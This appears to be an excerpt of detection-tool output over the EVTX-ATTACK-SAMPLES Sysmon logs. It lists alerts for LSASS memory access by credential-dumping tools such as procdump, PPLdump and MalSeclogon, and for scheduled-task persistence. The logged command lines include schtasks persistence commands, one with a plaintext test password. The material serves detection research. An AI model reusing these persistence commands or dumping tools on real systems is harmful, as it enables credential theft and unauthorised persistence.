+UtcTime: 2019-06-21 07:35:50.730
+SourceImage: C:\Windows\system32\rundll32.exe
+"
+2019-06-21T07:36:51.681567+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx,1,Microsoft-Windows-Sysmon,10,238386,alice.insecurebank.local,"TargetProcessId: 520
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3532
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: ECAD0485-8912-5D0C-0000-0010FD2F1F00
+SourceProcessId: 3552
+TargetProcessGUID: ECAD0485-822F-5D0C-0000-0010635E0000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+909ba|C:\Windows\SYSTEM32\wow64.dll+7174|C:\Windows\SYSTEM32\wow64.dll+9c7b|C:\Windows\system32\wow64cpu.dll+1dc5|C:\Windows\SYSTEM32\wow64.dll+1235a|C:\Windows\SYSTEM32\wow64.dll+12292|C:\Windows\SYSTEM32\ntdll.dll+c3d95|C:\Windows\SYSTEM32\ntdll.dll+a24de|C:\Windows\SYSTEM32\ntdll.dll+18c9e|C:\Windows\SYSTEM32\ntdll.dll+3c55c(wow64)|C:\Windows\SYSTEM32\ctiuser.dll+1a81e(wow64)|C:\Windows\SYSTEM32\KERNELBASE.dll+17468(wow64)|C:\Windows\SYSTEM32\ctiuser.dll+1605f(wow64)|C:\Users\administrator\Desktop\AndrewSpecial.exe+1135|C:\Users\administrator\Desktop\AndrewSpecial.exe+16ad|C:\Users\administrator\Desktop\AndrewSpecial.exe+1b1b|C:\Windows\SYSTEM32\KERNEL32.DLL+17c04(wow64)|C:\Windows\SYSTEM32\ntdll.dll+5ad8f(wow64)|C:\Windows\SYSTEM32\ntdll.dll+5ad5a(wow64)
+UtcTime: 2019-06-21 07:36:50.983
+SourceImage: C:\Users\administrator\Desktop\AndrewSpecial.exe
+"
+2019-06-21T07:36:51.682572+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx,1,Microsoft-Windows-Sysmon,10,238388,alice.insecurebank.local,"TargetProcessId: 520
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3532
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: ECAD0485-8912-5D0C-0000-0010FD2F1F00
+SourceProcessId: 3552
+TargetProcessGUID: ECAD0485-822F-5D0C-0000-0010635E0000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+909ba|C:\Windows\SYSTEM32\wow64.dll+7174|C:\Windows\SYSTEM32\wow64.dll+9c7b|C:\Windows\system32\wow64cpu.dll+1dc5|C:\Windows\SYSTEM32\wow64.dll+1235a|C:\Windows\SYSTEM32\wow64.dll+12292|C:\Windows\SYSTEM32\ntdll.dll+c3d95|C:\Windows\SYSTEM32\ntdll.dll+a24de|C:\Windows\SYSTEM32\ntdll.dll+18c9e|C:\Windows\SYSTEM32\ntdll.dll+3c55c(wow64)|C:\Windows\SYSTEM32\ctiuser.dll+1a81e(wow64)|C:\Windows\SYSTEM32\ntdll.dll+b7088(wow64)|C:\Windows\SYSTEM32\KERNEL32.DLL+39bb1(wow64)|C:\Windows\SYSTEM32\KERNEL32.DLL+29911(wow64)|C:\Windows\SYSTEM32\ctiuser.dll+13d59(wow64)|C:\Windows\SYSTEM32\dbghelp.dll+f852f(wow64)|C:\Windows\SYSTEM32\dbghelp.dll+f39c3(wow64)|C:\Windows\SYSTEM32\dbghelp.dll+ee1a7(wow64)|C:\Windows\SYSTEM32\dbghelp.dll+e9e2e(wow64)|C:\Windows\SYSTEM32\dbghelp.dll+ea1f5(wow64)|C:\Windows\SYSTEM32\ctiuser.dll+214b2(wow64)|C:\Users\administrator\Desktop\AndrewSpecial.exe+11c9|C:\Users\administrator\Desktop\AndrewSpecial.exe+16ad|C:\Users\administrator\Desktop\AndrewSpecial.exe+1b1b
+UtcTime: 2019-06-21 07:36:50.992
+SourceImage: C:\Users\administrator\Desktop\AndrewSpecial.exe
+"
+2019-07-19T14:57:46.459733+00:00,Scheduled Task Created via Command Line,../EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4086,MSEDGEWIN10,"Image: C:\Windows\System32\schtasks.exe
+RuleName: Persistence - Scheduled Task Management
+Description: Task Scheduler Configuration Tool
+TerminalSessionId: 1
+ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10""'
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 4276
+LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
+Hashes: SHA1=112C8FFA1C0934ACAAD2C58B3C7E81F3FB8E4A2C,MD5=3F9FD6D3B3E96B8F576DB72035DB38A7,SHA256=D6BA2CD73799477C051D9D864C47FCF5108064CDE07D3565871AFA10FC548086,IMPHASH=7EE4BC5589713B3470B8A950256E2E69
+ParentProcessGuid: 747F3D96-DA6A-5D31-0000-001072A63E00
+ProcessId: 1408
+CurrentDirectory: C:\AtomicRedTeam\
+ProcessGuid: 747F3D96-DA6A-5D31-0000-0010C4A83E00
+CommandLine: SCHTASKS  /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
+FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
+User: MSEDGEWIN10\IEUser
+LogonId: '0x50951'
+IntegrityLevel: High
+ParentImage: C:\Windows\System32\cmd.exe
+UtcTime: 2019-07-19 14:57:46.443
+"
+2019-07-19T14:57:46.849870+00:00,Scheduled Task Created via Command Line,../EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4090,MSEDGEWIN10,"Image: C:\Windows\System32\schtasks.exe
+RuleName: Persistence - Scheduled Task Management
+Description: Task Scheduler Configuration Tool
+TerminalSessionId: 1
+ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN "" Atomic ""task /TR C:\windows\system32\cmd.exe /SC daily /ST 20:10""'
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 3872
+LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
+Hashes: SHA1=112C8FFA1C0934ACAAD2C58B3C7E81F3FB8E4A2C,MD5=3F9FD6D3B3E96B8F576DB72035DB38A7,SHA256=D6BA2CD73799477C051D9D864C47FCF5108064CDE07D3565871AFA10FC548086,IMPHASH=7EE4BC5589713B3470B8A950256E2E69
+ParentProcessGuid: 747F3D96-DA6A-5D31-0000-001074C23E00
+ProcessId: 3352
+CurrentDirectory: C:\AtomicRedTeam\
+ProcessGuid: 747F3D96-DA6A-5D31-0000-0010C5C43E00
+CommandLine: SCHTASKS  /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN "" Atomic ""task /TR C:\windows\system32\cmd.exe /SC daily /ST 20:10
+FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
+User: MSEDGEWIN10\IEUser
+LogonId: '0x50951'
+IntegrityLevel: High
+ParentImage: C:\Windows\System32\cmd.exe
+UtcTime: 2019-07-19 14:57:46.845
+"
+2019-07-19T15:11:16.487990+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,10,4112,MSEDGEWIN10,"TargetProcessId: 612
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3272
+RuleName: ''
+GrantedAccess: '0x1010'
+SourceProcessGUID: 747F3D96-DD47-5D31-0000-001015874900
+SourceProcessId: 5840
+TargetProcessGUID: 747F3D96-D4A4-5D31-0000-00104A560000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\System32\KERNELBASE.dll+20d0e|UNKNOWN(0000026DBFD67240)
+UtcTime: 2019-07-19 15:11:16.481
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+"
+2019-07-29T21:34:40.889027+00:00,Scheduled Task Created via Command Line,../EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,5002,MSEDGEWIN10,"Image: C:\Windows\System32\schtasks.exe
+RuleName: Persistence - Scheduled Task Management
+Description: Task Scheduler Configuration Tool
+TerminalSessionId: 1
+ParentCommandLine: cmd  /c schtasks /create /tn ""mysc"" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru ""System"" /f
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 2916
+LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
+Hashes: SHA1=112C8FFA1C0934ACAAD2C58B3C7E81F3FB8E4A2C,MD5=3F9FD6D3B3E96B8F576DB72035DB38A7,SHA256=D6BA2CD73799477C051D9D864C47FCF5108064CDE07D3565871AFA10FC548086,IMPHASH=7EE4BC5589713B3470B8A950256E2E69
+ParentProcessGuid: 747F3D96-6670-5D3F-0000-001099048F00
+ProcessId: 7076
+CurrentDirectory: C:\Windows\system32\
+ProcessGuid: 747F3D96-6670-5D3F-0000-0010F9148F00
+CommandLine: schtasks  /create /tn ""mysc"" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru ""System"" /f
+FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
+User: MSEDGEWIN10\IEUser
+LogonId: '0x413182'
+IntegrityLevel: High
+ParentImage: C:\Windows\System32\cmd.exe
+UtcTime: 2019-07-29 21:34:40.755
+"
+2020-02-10T10:08:24.666489+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Defense Evasion/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx,1,Microsoft-Windows-Sysmon,10,20013,MSEDGEWIN10,"TargetProcessId: 624
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 8364
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: 747F3D96-2B98-5E41-0000-00109C904700
+SourceProcessId: 5016
+TargetProcessGUID: 747F3D96-A042-5E41-0000-0010E4560000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9f844|C:\Windows\System32\KERNELBASE.dll+1ef87|C:\Windows\System32\KERNEL32.DLL+15310|c:\Users\Public\BYOV\ZAM64\ppldump.exe+1b0c|c:\Users\Public\BYOV\ZAM64\ppldump.exe+1844|c:\Users\Public\BYOV\ZAM64\ppldump.exe+13a5|c:\Users\Public\BYOV\ZAM64\ppldump.exe+150b|C:\Windows\System32\KERNEL32.DLL+17974|C:\Windows\SYSTEM32\ntdll.dll+6a271
+UtcTime: 2020-02-10 10:08:24.652
+SourceImage: c:\Users\Public\BYOV\ZAM64\ppldump.exe
+"
+2020-07-07T21:51:39.204637+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_2x10_lsass_with_different_pid_RtlCreateProcessReflection.evtx,1,Microsoft-Windows-Sysmon,10,2125126,LAPTOP-JU4M3I0E,"TargetProcessId: 908
+TargetImage: C:\windows\system32\lsass.exe
+SourceThreadId: 5576
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: 00247C92-EE6B-5F04-0000-00108C67A859
+SourceProcessId: 30256
+TargetProcessGUID: 00247C92-DC62-5EEF-0000-001026F60100
+CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\wow64.dll+ba94|C:\windows\System32\wow64.dll+7123|C:\windows\System32\wow64cpu.dll+1783|C:\windows\System32\wow64cpu.dll+1199|C:\windows\System32\wow64.dll+c77a|C:\windows\System32\wow64.dll+c637|C:\windows\SYSTEM32\ntdll.dll+718eb|C:\windows\SYSTEM32\ntdll.dll+717d3|C:\windows\SYSTEM32\ntdll.dll+7177e|C:\windows\SYSTEM32\ntdll.dll+7208c(wow64)|C:\windows\System32\KERNELBASE.dll+f10a8(wow64)|C:\Users\Public\tools\SysinternalsSuite\procdump.exe+7c36|C:\windows\System32\KERNEL32.DLL+16359(wow64)|C:\windows\SYSTEM32\ntdll.dll+67c24(wow64)|C:\windows\SYSTEM32\ntdll.dll+67bf4(wow64)
+UtcTime: 2020-07-07 21:51:39.203
+SourceImage: C:\Users\Public\tools\SysinternalsSuite\procdump.exe
+"
+2020-07-07T21:51:39.256632+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_2x10_lsass_with_different_pid_RtlCreateProcessReflection.evtx,1,Microsoft-Windows-Sysmon,10,2125128,LAPTOP-JU4M3I0E,"TargetProcessId: 908
+TargetImage: C:\windows\system32\lsass.exe
+SourceThreadId: 3444
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: 00247C92-EE6B-5F04-0000-00109069A859
+SourceProcessId: 28528
+TargetProcessGUID: 00247C92-DC62-5EEF-0000-001026F60100
+CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+2726e|C:\Users\Public\tools\SysinternalsSuite\procdump64.exe+82b4|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
+UtcTime: 2020-07-07 21:51:39.256
+SourceImage: C:\Users\Public\tools\SysinternalsSuite\procdump64.exe
+"
+2020-07-07T21:51:39.262862+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_2x10_lsass_with_different_pid_RtlCreateProcessReflection.evtx,1,Microsoft-Windows-Sysmon,10,2125129,LAPTOP-JU4M3I0E,"TargetProcessId: 30096
+TargetImage: C:\windows\system32\lsass.exe
+SourceThreadId: 22356
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: 00247C92-EE6B-5F04-0000-00109069A859
+SourceProcessId: 28528
+TargetProcessGUID: 00247C92-EE6B-5F04-0000-00105C6CA859
+CallTrace: C:\windows\SYSTEM32\ntdll.dll+9ca14|C:\windows\SYSTEM32\ntdll.dll+110610|C:\windows\System32\KERNELBASE.dll+d68de|C:\Users\Public\tools\SysinternalsSuite\procdump64.exe+120bb|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
+UtcTime: 2020-07-07 21:51:39.262
+SourceImage: C:\Users\Public\tools\SysinternalsSuite\procdump64.exe
+"
+2020-10-23T21:57:36.631669+00:00,Scheduled Task Created via Command Line,../EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/rundll32_cmd_schtask.evtx,1,Microsoft-Windows-Sysmon,1,424079,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\schtasks.exe
+RuleName: ''
+Description: Task Scheduler Configuration Tool
+OriginalFileName: schtasks.exe
+TerminalSessionId: 1
+ParentCommandLine: '""C:\Windows\System32\cmd.exe""  /C schtasks /Create /f /XML C:\Users\IEUser\AppData\Local\Temp\sduchxll.tmp /TN DataUsageHandlers'
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 5572
+LogonGuid: 747F3D96-4690-5F93-0000-002085A50800
+Hashes: SHA1=77F125CE5840293890E1359483C7104AADE25FA7,MD5=5BD86A7193D38880F339D4AFB1F9B63A,SHA256=72900A86F3BED7570AA708657A76DD76BB80B68DB543D303DA401AC6983E39CE,IMPHASH=012D1B3C5FD8B10F0F36DB7243A28CB8
+ParentProcessGuid: 747F3D96-51D0-5F93-0000-0010B2B35B00
+ProcessId: 8572
+CurrentDirectory: C:\Users\IEUser\AppData\Local\Temp\tmp1375\
+ProcessGuid: 747F3D96-51D0-5F93-0000-001079C05B00
+CommandLine: schtasks  /Create /f /XML C:\Users\IEUser\AppData\Local\Temp\sduchxll.tmp /TN DataUsageHandlers
+FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
+User: MSEDGEWIN10\IEUser
+LogonId: '0x8a585'
+IntegrityLevel: High
+ParentImage: C:\Windows\SysWOW64\cmd.exe
+UtcTime: 2020-10-23 21:57:36.627
+"
+2021-04-22T22:09:25.417739+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/ppl_bypass_ppldump_knowdll_hijack_sysmon_security.evtx,1,Microsoft-Windows-Sysmon,10,564590,MSEDGEWIN10,"TargetProcessId: 652
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 2544
+RuleName: ''
+GrantedAccess: '0x1000'
+SourceProcessGUID: 747F3D96-F415-6081-0000-001040FE4900
+SourceProcessId: 6316
+TargetProcessGUID: 747F3D96-6E19-6082-0000-001070650000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\System32\KERNELBASE.dll+2126e|c:\Users\IEUser\Desktop\PPLdump.exe+211e|c:\Users\IEUser\Desktop\PPLdump.exe+12c7|c:\Users\IEUser\Desktop\PPLdump.exe+35c6|c:\Users\IEUser\Desktop\PPLdump.exe+45f8|C:\Windows\System32\KERNEL32.DLL+17974|C:\Windows\SYSTEM32\ntdll.dll+6a271
+UtcTime: 2021-04-22 22:09:25.417
+SourceImage: c:\Users\IEUser\Desktop\PPLdump.exe
+"
+2021-04-22T22:09:25.418067+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/ppl_bypass_ppldump_knowdll_hijack_sysmon_security.evtx,1,Microsoft-Windows-Sysmon,10,564591,MSEDGEWIN10,"TargetProcessId: 652
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 2544
+RuleName: ''
+GrantedAccess: '0x1000'
+SourceProcessGUID: 747F3D96-F415-6081-0000-001040FE4900
+SourceProcessId: 6316
+TargetProcessGUID: 747F3D96-6E19-6082-0000-001070650000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\System32\KERNELBASE.dll+2126e|c:\Users\IEUser\Desktop\PPLdump.exe+21a9|c:\Users\IEUser\Desktop\PPLdump.exe+12c7|c:\Users\IEUser\Desktop\PPLdump.exe+35c6|c:\Users\IEUser\Desktop\PPLdump.exe+45f8|C:\Windows\System32\KERNEL32.DLL+17974|C:\Windows\SYSTEM32\ntdll.dll+6a271
+UtcTime: 2021-04-22 22:09:25.417
+SourceImage: c:\Users\IEUser\Desktop\PPLdump.exe
+"
+2021-04-22T22:09:26.163584+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/ppl_bypass_ppldump_knowdll_hijack_sysmon_security.evtx,1,Microsoft-Windows-Sysmon,10,564597,MSEDGEWIN10,"TargetProcessId: 652
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 7032
+RuleName: ''
+GrantedAccess: '0x1410'
+SourceProcessGUID: 747F3D96-F416-6081-0000-001033034A00
+SourceProcessId: 7188
+TargetProcessGUID: 747F3D96-6E19-6082-0000-001070650000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\System32\KERNELBASE.dll+2126e|C:\Windows\System32\EventAggregation.dll+1580|C:\Windows\System32\EventAggregation.dll+1d12|C:\Windows\System32\EventAggregation.dll+2043|C:\Windows\SYSTEM32\ntdll.dll+48f17|C:\Windows\SYSTEM32\ntdll.dll+44875|C:\Windows\SYSTEM32\ntdll.dll+44658|C:\Windows\SYSTEM32\ntdll.dll+44682|C:\Windows\SYSTEM32\ntdll.dll+d630a|C:\Windows\SYSTEM32\ntdll.dll+c38b9|C:\Windows\SYSTEM32\ntdll.dll+756c3|C:\Windows\SYSTEM32\ntdll.dll+7566e
+UtcTime: 2021-04-22 22:09:26.157
+SourceImage: C:\Windows\system32\services.exe
+"
+2021-04-22T22:09:26.163884+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/ppl_bypass_ppldump_knowdll_hijack_sysmon_security.evtx,1,Microsoft-Windows-Sysmon,10,564598,MSEDGEWIN10,"TargetProcessId: 652
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 7032
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: 747F3D96-F416-6081-0000-001033034A00
+SourceProcessId: 7188
+TargetProcessGUID: 747F3D96-6E19-6082-0000-001070650000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\SYSTEM32\ntdll.dll+7a747|C:\Windows\System32\KERNEL32.DLL+1c5b4|C:\Windows\System32\KERNEL32.DLL+237f8|C:\Windows\system32\dbgcore.DLL+9247|C:\Windows\system32\dbgcore.DLL+15dc5|C:\Windows\system32\dbgcore.DLL+fec6|C:\Windows\system32\dbgcore.DLL+5f56|C:\Windows\system32\dbgcore.DLL+69f7|C:\Windows\System32\EventAggregation.dll+15d2|C:\Windows\System32\EventAggregation.dll+1d12|C:\Windows\System32\EventAggregation.dll+2043|C:\Windows\SYSTEM32\ntdll.dll+48f17|C:\Windows\SYSTEM32\ntdll.dll+44875|C:\Windows\SYSTEM32\ntdll.dll+44658|C:\Windows\SYSTEM32\ntdll.dll+44682|C:\Windows\SYSTEM32\ntdll.dll+d630a|C:\Windows\SYSTEM32\ntdll.dll+c38b9|C:\Windows\SYSTEM32\ntdll.dll+756c3|C:\Windows\SYSTEM32\ntdll.dll+7566e
+UtcTime: 2021-04-22 22:09:26.159
+SourceImage: C:\Windows\system32\services.exe
+"
+2021-12-07T17:33:01.680326+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/tutto_malseclogon.evtx,1,Microsoft-Windows-Sysmon,10,619520,MSEDGEWIN10,"TargetProcessId: 5268
+TargetImage: C:\Windows\system32\lsass.exe
+TargetUser: NT AUTHORITY\SYSTEM
+SourceThreadId: 10032
+RuleName: '-'
+SourceUser: MSEDGEWIN10\IEUser
+GrantedAccess: '0x1410'
+SourceProcessGUID: 747F3D96-9ACD-61AF-D501-000000000102
+SourceProcessId: 6072
+TargetProcessGUID: 747F3D96-9ACD-61AF-D701-000000000102
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+a0104|Z:\bouss\Downloads\MalSeclogon-master\x64\Debug\MalSeclogon.exe+122b8|Z:\bouss\Downloads\MalSeclogon-master\x64\Debug\MalSeclogon.exe+13eef|Z:\bouss\Downloads\MalSeclogon-master\x64\Debug\MalSeclogon.exe+14a59|Z:\bouss\Downloads\MalSeclogon-master\x64\Debug\MalSeclogon.exe+148fe|Z:\bouss\Downloads\MalSeclogon-master\x64\Debug\MalSeclogon.exe+147be|Z:\bouss\Downloads\MalSeclogon-master\x64\Debug\MalSeclogon.exe+14ae9|C:\Windows\System32\KERNEL32.DLL+17974|C:\Windows\SYSTEM32\ntdll.dll+6a271
+UtcTime: 2021-12-07 17:33:01.672
+SourceImage: Z:\bouss\Downloads\MalSeclogon-master\x64\Debug\MalSeclogon.exe
+"
